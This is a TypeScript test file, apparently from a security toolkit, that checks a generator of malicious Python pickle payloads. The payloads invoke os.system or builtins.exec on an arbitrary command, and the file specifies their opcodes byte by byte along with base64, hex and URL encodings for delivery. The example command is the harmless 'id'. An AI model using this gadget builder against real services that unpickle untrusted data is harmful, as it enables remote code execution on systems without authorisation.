import { describe, expect, it } from 'vitest'

import { buildPicklePayload, encodePayload } from './pickle_gadget'

describe('buildPicklePayload', () => {
  it('os.system(cmd) pickle 를 결정적 opcode 로 만든다', () => {
    const buf = buildPicklePayload('id')
    // PROTO2 \x80\x02, GLOBAL 'cos\nsystem\n', MARK '(', SHORT_BINSTRING 'U\x02id', 'tR.'
    expect([...buf.subarray(0, 2)]).toEqual([0x80, 0x02])
    expect(buf.subarray(2, 13).toString('latin1')).toBe('cos\nsystem\n')
    expect(buf.subarray(13, 14).toString('latin1')).toBe('(')
    expect([...buf.subarray(14, 16)]).toEqual([0x55, 0x02]) // 'U' len=2
    expect(buf.subarray(16, 18).toString('latin1')).toBe('id')
    expect(buf.subarray(18).toString('latin1')).toBe('tR.')
  })

  it('255바이트 초과 명령은 BINSTRING(T + 4바이트 LE)으로 전환', () => {
    const long = 'a'.repeat(300)
    const buf = buildPicklePayload(long)
    const i = buf.indexOf(0x54) // 'T'
    expect(i).toBeGreaterThan(0)
    expect(buf.readUInt32LE(i + 1)).toBe(300)
  })

  it('callable 교체 가능 (builtins.exec 로 파이썬 소스 실행)', () => {
    const buf = buildPicklePayload('print(1)', 'builtins\nexec')
    expect(buf.subarray(2).toString('latin1').startsWith('cbuiltins\nexec\n')).toBe(true)
  })
})

describe('encodePayload', () => {
  const buf = buildPicklePayload('id')
  it('base64/hex/url/latin1 인코딩', () => {
    expect(encodePayload(buf, 'base64')).toBe(buf.toString('base64'))
    expect(encodePayload(buf, 'hex')).toBe(buf.toString('hex'))
    expect(encodePayload(buf, 'latin1')).toBe(buf.toString('latin1'))
    expect(encodePayload(buf, 'url')).toBe(encodeURIComponent(buf.toString('latin1')))
  })
})
